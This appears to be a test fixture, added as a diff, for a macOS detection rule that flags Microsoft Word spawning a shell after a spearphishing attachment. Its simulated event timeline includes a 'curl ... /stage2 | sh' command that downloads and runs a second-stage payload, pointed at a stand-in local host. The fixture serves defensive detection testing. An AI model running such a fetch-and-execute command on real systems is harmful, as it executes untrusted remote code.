@@ -1,0 +1,44 @@
+# T1566.001 Spearphishing Attachment + T1059.004 Unix Shell.
+#
+# Textbook post-phish step: Office app (here Microsoft Word) shells out to
+# /bin/bash. The shell_from_office rule matches on the canonical Office
+# binary paths under /Applications/Microsoft *.app/Contents/MacOS/* as the
+# parent of an exec into a known shell.
+name: "T1566.001/T1059.004 shell spawned by Microsoft Word"
+host:
+  id: AAAA1059-0004-0000-0000-000000000004
+  hostname: efficacy-t1566-001.local
+  os: macOS 26.0
+timeline:
+  # Word itself (the parent process). We don't need a fork/exec for Word --
+  # the rule's match is on the child exec's ppid -> path lookup via the
+  # process graph, so Word must be present as the ppid's path in graph
+  # state. The fork+exec sequence below seeds that graph state.
+  - at: 0ms
+    type: fork
+    child_pid: 7001
+    parent_pid: 1
+  - at: 10ms
+    type: exec
+    pid: 7001
+    ppid: 1
+    path: /Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word
+    args: ["Microsoft Word"]
+    cwd: /Users/victor
+    uid: 501
+    gid: 20
+
+  # Word shells out -- the rule fires on this exec.
+  - at: 50ms
+    type: fork
+    child_pid: 7002
+    parent_pid: 7001
+  - at: 60ms
+    type: exec
+    pid: 7002
+    ppid: 7001
+    path: /bin/bash
+    args: ["bash", "-c", "curl http://127.0.0.1:9/stage2 | sh"]
+    cwd: /Users/victor
+    uid: 501
+    gid: 20
